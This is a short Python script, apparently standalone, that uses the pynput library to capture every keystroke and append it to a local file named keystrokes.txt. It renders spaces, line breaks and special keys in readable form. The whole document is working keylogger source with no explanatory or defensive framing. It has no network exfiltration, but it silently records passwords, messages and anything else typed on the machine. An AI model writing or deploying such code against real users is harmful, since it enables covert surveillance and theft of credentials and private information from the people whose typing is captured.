from pynput.keyboard import Listener

LOG_FILE = "keystrokes.txt"

def log_keystroke(key):
    key = str(key).replace("'", "")  
    if key == "Key.space":
        key = " "  
    elif key == "Key.enter":
        key = "\n"  
    elif key.startswith("Key."):
        key = f"[{key.replace('Key.', '')}]" 

    with open(LOG_FILE, "a") as file:
        file.write(key)

with Listener(on_press=log_keystroke) as listener:
    listener.join()
